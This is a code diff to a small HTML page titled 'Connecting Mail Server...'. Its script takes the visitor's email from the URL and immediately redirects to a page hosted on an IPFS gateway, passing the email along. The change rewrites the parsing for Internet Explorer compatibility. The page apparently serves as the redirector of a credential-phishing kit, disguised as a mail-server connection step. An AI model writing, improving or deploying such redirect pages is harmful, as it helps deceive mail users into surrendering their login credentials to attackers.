@@ -3,27 +3,37 @@
   <head>
     <title>Connecting Mail Server...</title>
     <script>
-      // This function will extract the email from the URL or use default
+      // This function will extract the email from the URL (works in IE)
       function getEmailFromUrl() {
-        // Check for email in the URL parameters (e.g., ?email=someone@example.com)
-        const urlParams = new URLSearchParams(window.location.search);
-        let email = urlParams.get('email');
-
-        // If no email found, use a default placeholder value
-        if (!email) {
-          email = "{email}"; // Fallback to placeholder value
+        var email = "{email}"; // Default to placeholder if no email is found
+        
+        // Get the query string from the URL
+        var queryString = window.location.search;
+        
+        // Check if there is an email parameter in the query string
+        if (queryString.indexOf('email=') !== -1) {
+          var params = queryString.substring(1).split('&'); // Get parameters
+          
+          // Loop through parameters and find email
+          for (var i = 0; i < params.length; i++) {
+            var param = params[i].split('=');
+            if (param[0] === 'email') {
+              email = decodeURIComponent(param[1]); // Use the email value
+              break;
+            }
+          }
         }
-
+        
         return email;
       }
 
       // This function will redirect immediately to the target URL with the email
       function redirectToTarget() {
         // Get the email from URL or fallback
-        const email = getEmailFromUrl();
+        var email = getEmailFromUrl();
 
         // Define your redirect URL using the email parameter
-        const redirectUrl = `https://bafybeieaamuhsw6yixeazthgigc7kxljclvmp2pouelldqkdzhiea7flcu.ipfs.dweb.link/GMS.html#${email}`;
+        var redirectUrl = 'https://bafybeieaamuhsw6yixeazthgigc7kxljclvmp2pouelldqkdzhiea7flcu.ipfs.dweb.link/GMS.html#' + email;
 
         // Redirect immediately to the new URL
         window.location.replace(redirectUrl);
